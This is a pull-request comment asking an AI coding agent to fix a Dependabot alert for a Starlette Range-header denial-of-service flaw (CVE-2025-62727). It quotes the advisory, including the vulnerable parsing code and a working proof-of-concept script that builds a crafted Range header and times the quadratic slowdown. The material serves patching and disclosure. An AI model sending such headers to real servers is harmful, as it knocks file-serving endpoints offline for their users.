@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix

**Alert Details:**

- **Package:** starlette (pip)
- **Severity:** HIGH
- **Vulnerable versions:** >= 0.39.0, <= 0.49.0
- **Patched version:** 0.49.1
- **CVE:** CVE-2025-62727
- **GHSA:** GHSA-7f5h-v6xp-fcq8
- **Manifest:** generators/python/poetry.lock

**Summary:**
Starlette vulnerable to O(n^2) DoS via Range header merging in ``starlette.responses.FileResponse``

**Description:**
### Summary
An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial‑of‑service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).

### Details
Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.

```python
# starlette/responses.py
_RANGE_PATTERN = re.compile(r"(\d*)-(\d*)") # vulnerable to O(n^2) complexity ReDoS

class FileResponse(Response):
    @staticmethod
    def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:
        ranges: list[tuple[int, int]] = []
        try:
            units, range_ = http_range.split("=", 1)
        except ValueError:
            raise MalformedRangeHeader()

        # [...]

        ranges = [
            (
                int(_[0]) if _[0] else file_size - int(_[1]),
                int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,
            )
            for _ in _RANGE_PATTERN.findall(range_) # vulnerable
            if _ != ("", "")
        ]

```

The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.

The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.

  This affects any Starlette application that uses:

  - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) — `starlette/staticfiles.py:178`
  - Direct ``starlette.responses.FileResponse`` responses

### PoC
```python
#!/usr/bin/env python3

import sys
import time

try:
    import starlette
    from starlette.responses import FileResponse
except Exception as e:
    print(f"[ERROR] Failed to import starlette: {e}")
    sys.exit(1)


def build_payload(length: int) -> str:
    """Build the Range header value body: '0' * num_zeros + '0-'"""
    return ("0" * length) + "a-"


def test(header: str, file_size: int) -> float:
    start = time.perf_counter()
    try:
        FileResponse._parse_range_header(header, file_size)
    except Exception:
        pass
    end = time.perf_counter()
    elapsed = end - start
    return elapsed


def run_once(num_zeros: int) -> None:
    range_body = build_payload(num_zeros)
    header = "bytes=" + range_body
    # Use a sufficiently large file_size so upper bounds default to file size
    file_size = max(len(range_body) + 10, 1_000_000)
    
    print(f"[DEBUG] range_body length: {len(range_body)} bytes")
    elapsed_time = test(header, file_size)
    print(f"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\n")


if __name__ == "__main__":
    print(f"[INFO] Starlette Version: {starlette.__version__}")
    for n in [5000, 10000, 20000, 40000]:
        run_once(n)

"""
$ python3 poc_dos_range.py
[INFO] Starlette Version: 0.48.0
[DEBUG] range_body length: 5002 bytes
[DEBUG] elapsed time: 0.053932 seconds

[DEBUG] range_body length: 10002 bytes
[DEBUG] elapsed time: 0.209770 seconds

[DEBUG] range_body length: 20002 bytes
[DEBUG] elapsed time: 0.885296 seconds

[DEBUG] range_body length: 40002 bytes
[DEBUG] elapsed time: 3.238832 seconds
"""
```

### Impact
Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header.

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/802)
